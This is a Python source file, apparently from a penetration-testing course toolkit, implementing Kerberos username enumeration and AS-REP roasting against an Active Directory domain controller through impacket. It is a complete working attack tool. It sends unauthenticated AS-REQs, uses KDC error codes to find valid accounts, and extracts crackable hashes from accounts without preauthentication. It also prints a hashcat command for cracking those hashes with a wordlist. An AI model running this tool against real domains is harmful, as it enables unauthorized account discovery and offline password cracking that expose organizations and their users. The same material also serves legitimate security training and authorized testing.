#!/usr/bin/env python3
"""
redshift_toolkit.ad.kerb_brute — Kerberos username enumeration + AS-REP roasting.

Two operations in one tool:

1) Username enumeration: send AS-REQ for each candidate; the KDC's error code
   discriminates valid-but-needs-preauth from unknown principals.

2) AS-REP roasting: any user with DONT_REQ_PREAUTH (uac bit 0x400000) returns
   a TGT encrypted with their NTLM-derived key — offline-crackable
   (hashcat -m 18200).

Authentication is NOT required for username enumeration: if the KDC responds
to "alice@LAB.LOCAL" with KDC_ERR_PREAUTH_REQUIRED, the user exists.

Usage
-----
  # Enumerate usernames (no creds needed)
  python3 -m redshift_toolkit.ad.kerb_brute \\
      --dc dc01.lab.local --domain lab.local \\
      --userlist users.txt --enum

  # AS-REP roast (no creds needed; outputs hashcat-format hashes)
  python3 -m redshift_toolkit.ad.kerb_brute \\
      --dc dc01.lab.local --domain lab.local \\
      --userlist users.txt --as-rep-roast --output asrep.hashes

  # Combine with an LDAP-derived list (from ad_enum.py output)
  jq -r '.as_rep_roastable[]' enum.json | python3 -m redshift_toolkit.ad.kerb_brute \\
      --dc dc01.lab.local --domain lab.local --as-rep-roast --userlist /dev/stdin

Requires
--------
  pip install impacket

Author: Redshift Project — Module 18
License: MIT
"""

from __future__ import annotations

import argparse
import json
import sys
from dataclasses import asdict, dataclass, field
from typing import Any

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GREY = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


@dataclass
class KerbResult:
    valid_users: list[str] = field(default_factory=list)
    invalid_users: list[str] = field(default_factory=list)
    asrep_hashes: list[dict[str, str]] = field(default_factory=list)
    errors: list[dict[str, str]] = field(default_factory=list)


def _format_asrep_hashcat(username: str, realm: str, asrep) -> str:
    """Format an AS-REP for hashcat -m 18200 ($krb5asrep$<etype>$user@realm:cipher$enc)."""
    # Cipher is enc-part:cipher (the encryption blob); etype is enc-part:etype
    try:
        enc_part = asrep["enc-part"]
        etype = enc_part["etype"]
        cipher = enc_part["cipher"]
        # impacket cipher returns bytes; sometimes Asn1Item wrapper
        try:
            cipher_bytes = bytes(cipher)
        except TypeError:
            cipher_bytes = cipher.asOctets()
        cipher_hex = cipher_bytes.hex()
        # Hashcat 18200 wants: $krb5asrep$<etype>$user@realm:checksum$encrypted
        # The first 16 bytes (32 hex chars) of cipher are the checksum, rest is the rest
        checksum = cipher_hex[:32]
        rest = cipher_hex[32:]
        return f"$krb5asrep${int(etype)}${username}@{realm}:{checksum}${rest}"
    except Exception as e:
        raise RuntimeError(f"could not format AS-REP for {username}: {e}")


def kerb_request(dc: str, username: str, domain: str, no_preauth: bool):
    """Send AS-REQ; return tuple (status_code_str, asrep_or_None).

    status codes returned:
      "VALID_NEEDS_PREAUTH"  — user exists, requires preauth (KDC_ERR_PREAUTH_REQUIRED)
      "VALID_NO_PREAUTH"     — user exists, AS-REP returned (asreproastable)
      "INVALID"              — KDC_ERR_C_PRINCIPAL_UNKNOWN
      "DISABLED"             — KDC_ERR_CLIENT_REVOKED
      "ERROR:<msg>"          — other failure
    """
    try:
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import AS_REP, AS_REQ, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter
        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
        from impacket.krb5.types import KerberosTime, Principal
        from pyasn1.codec.der import decoder, encoder
        from pyasn1.type.univ import noValue
    except ImportError:
        sys.stderr.write("error: this tool requires `pip install impacket`\n")
        sys.exit(2)

    import datetime as _dt
    import random

    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    as_req["padata"] = noValue
    as_req["padata"][0] = noValue
    as_req["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    pac = KERB_PA_PAC_REQUEST()
    pac["include-pac"] = True
    as_req["padata"][0]["padata-value"] = encoder.encode(pac)

    req_body = seq_set(as_req, "req-body")
    opts = list()
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable.value)
    opts.append(constants.KDCOptions.proxiable.value)
    req_body["kdc-options"] = constants.encodeFlags(opts)
    seq_set(req_body, "sname", lambda f: (f.setComponentByPosition(0, int(constants.PrincipalNameType.NT_PRINCIPAL.value)),
                                          f.setComponentByPosition(1, ["krbtgt", domain.upper()])))
    seq_set(req_body, "cname", lambda f: (f.setComponentByPosition(0, int(constants.PrincipalNameType.NT_PRINCIPAL.value)),
                                          f.setComponentByPosition(1, [username])))
    req_body["realm"] = domain.upper()
    now = _dt.datetime.utcnow() + _dt.timedelta(days=1)
    req_body["till"] = KerberosTime.to_asn1(now)
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = random.SystemRandom().getrandbits(31)
    seq_set_iter(req_body, "etype", (
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ))

    msg = encoder.encode(as_req)
    try:
        rep = sendReceive(msg, domain.upper(), dc)
        # If we get here, KDC returned an AS-REP (no preauth required)
        try:
            decoded = decoder.decode(rep, asn1Spec=AS_REP())[0]
            return ("VALID_NO_PREAUTH", decoded)
        except Exception:
            return ("VALID_NO_PREAUTH", None)
    except KerberosError as ke:
        # Inspect ke.getErrorCode()
        code = ke.getErrorCode()
        if code == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
            return ("VALID_NEEDS_PREAUTH", None)
        if code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
            return ("INVALID", None)
        if code == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
            return ("DISABLED", None)
        return (f"ERROR:{ke}", None)
    except Exception as e:
        return (f"ERROR:{e}", None)


def main():
    p = argparse.ArgumentParser(
        prog="kerb_brute",
        description="Kerberos username enumeration + AS-REP roasting",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--dc", required=True, help="Domain controller (FQDN or IP)")
    p.add_argument("--domain", required=True, help="Domain (e.g. lab.local)")
    p.add_argument("--userlist", required=True, help="File with one username per line")
    p.add_argument("--enum", action="store_true", help="Enumerate valid usernames only")
    p.add_argument("--as-rep-roast", action="store_true", help="Collect AS-REP hashes for asreproastable users")
    p.add_argument("--output", help="Output file for AS-REP hashes")
    p.add_argument("--format", choices=("text", "json"), default="text")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args()

    on = sys.stdout.isatty() and not args.no_color
    if not (args.enum or args.as_rep_roast):
        args.enum = True
        args.as_rep_roast = True

    try:
        with open(args.userlist) as f:
            users = [u.strip() for u in f if u.strip() and not u.startswith("#")]
    except OSError as e:
        sys.stderr.write(f"could not read userlist: {e}\n")
        sys.exit(2)

    result = KerbResult()
    out_fh = open(args.output, "w") if args.output else None

    for username in users:
        status, asrep = kerb_request(args.dc, username, args.domain, no_preauth=True)
        if status == "VALID_NEEDS_PREAUTH":
            result.valid_users.append(username)
            if args.format == "text":
                print(paint(f"[+] {username:30s} VALID (preauth required)", GREEN, on))
        elif status == "VALID_NO_PREAUTH":
            result.valid_users.append(username)
            if args.format == "text":
                print(paint(f"[!] {username:30s} VALID — AS-REP RETURNED (asreproastable)", YELLOW, on))
            if args.as_rep_roast and asrep is not None:
                try:
                    h = _format_asrep_hashcat(username, args.domain.upper(), asrep)
                    result.asrep_hashes.append({"user": username, "hash": h})
                    if out_fh:
                        out_fh.write(h + "\n")
                except Exception as e:
                    result.errors.append({"user": username, "error": str(e)})
        elif status == "INVALID":
            result.invalid_users.append(username)
            if args.format == "text":
                print(paint(f"[-] {username:30s} invalid", GREY, on))
        elif status == "DISABLED":
            result.valid_users.append(username)
            if args.format == "text":
                print(f"[~] {username:30s} valid but DISABLED")
        else:
            result.errors.append({"user": username, "error": status})

    if out_fh:
        out_fh.close()

    if args.format == "json":
        print(json.dumps(asdict(result), indent=2))
    else:
        print(paint(f"\n[+] Valid: {len(result.valid_users)}  Invalid: {len(result.invalid_users)}  AS-REP: {len(result.asrep_hashes)}",
                    BOLD, on))
        if args.output and result.asrep_hashes:
            print(f"[+] AS-REP hashes written to {args.output}")
            print(f"    Crack with: hashcat -m 18200 {args.output} rockyou.txt -r best64.rule")


if __name__ == "__main__":
    main()
